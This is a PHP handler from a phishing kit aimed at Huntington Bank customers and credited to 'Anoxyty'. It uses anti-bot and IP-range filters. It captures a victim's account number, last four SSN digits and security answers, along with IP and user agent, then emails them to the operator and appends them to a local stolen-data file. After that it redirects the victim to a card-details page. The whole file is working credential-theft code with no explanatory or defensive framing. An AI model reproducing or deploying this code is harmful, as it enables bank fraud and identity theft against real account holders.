<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
require 'T3R/bot.php';
	require 'T3R/usera.php';
	require 'T3R/rangip.php';
		require 'T3R/usera2.php';
	
	ob_start();
session_start();
	include 'yours.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['q1'] ) ) {
		
		$_SESSION['q1'] 	  = $_POST['q1'];
		$_SESSION['AccountNumber'] 	  = $_POST['AccountNumber'];
				$_SESSION['q2'] 	  = $_POST['q2'];
		$_SESSION['SSNLastFour'] 	  = $_POST['SSNLastFour'];
				$_SESSION['q3'] 	  = $_POST['q3'];
		$_SESSION['ans3'] 	  = $_POST['ans3'];
		$code = <<<EOT
============== [ Huntington Question By Anoxyty | ]🔥 ==============
[Question 1] 		: {$_SESSION['q1']}
[Answer 1]		: {$_SESSION['AccountNumber']}
[Question 2] 		: {$_SESSION['q2']}
[Answer 2]		: {$_SESSION['SSNLastFour']}
[Question 3] 		: {$_SESSION['q3']}
[Answer 3]		: {$_SESSION['ans3']}
	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 Huntington Question By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "💼 Huntington Question By Anoxyty💼  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <wellsby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($yours,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: cardb.php?&sessionid={$_SESSION['randString']}&ue");
        exit();
	} else {
		header("Location: verif.php?&sessionid={$_SESSION['randString']}&ue");
		exit();
	}
?>